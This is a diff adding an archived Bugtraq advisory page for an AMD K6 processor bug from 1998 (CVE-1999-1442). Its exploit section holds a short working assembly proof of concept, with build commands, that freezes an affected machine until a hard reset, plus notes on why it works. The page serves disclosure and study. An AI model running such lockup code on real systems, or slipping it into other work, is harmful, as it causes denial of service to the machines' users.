@@ -1,0 +1,99 @@
+#bid105<p><b><span style="font-size: 18pt;">AMD K6 Processor Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/105/info">info</a><br><a href="http://www.securityfocus.com/bid/105/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/105/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/105/solution">solution</a><br><a href="http://www.securityfocus.com/bid/105/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				105
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-1442<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 01 1998 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 12:16AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was published by Benoit Poulot-Cazajous 
+&lt;poulot@sunchorus.france.sun.com&gt; in the linux-kernel mailing list on
+June 01, 1998.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					AMD K6  <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	$ cat a.s<br/>.text<br/>.align 4096 /* r1 */<br/>.globl _start<br/>_start:<br/>movl _start, %edi /* S1 */<br/>cmpb 0x80000000(%edi),%dl /* r2, S2 */<br/>je nowhere /* r3 */<br/>ret<br/>$ as -o a.o a.s<br/>$ ld -defsym nowhere=0xc0000000 a.o<br/>$ ./a.out<br/>&amp;lt;lockup. hard reset required&amp;gt;<br/><br/>Remarks :<br/>r1) _start must be aligned, otherwise you get a segfault instead of a lockup.<br/>r2) Using movb instead of compb does not work.<br/>r3) Tries to escape the code segment. Before Linux 2.1.43, the code segments ended <br/>at bfffffff. After and including 2.1.43, escaping is not possible, because<br/>the code segment covers the whole address space (reducing this segment<br/>to 3.75 GB allows to trigger the bug on 2.1.103).<br/><br/>Speculations :<br/>S1) edi must be loaded with the address of something in a deep cache on the <br/>CPU. _start works well.<br/>S2) tries to access an invalid address. This address should look like an <br/>already cached address. If only the highest bits are different, it is<br/>probably more difficult to notice that the address is not really cached.<br/>So using _start+0x80000000 works well.
+	
+		<ul>
+</ul>
+</div>
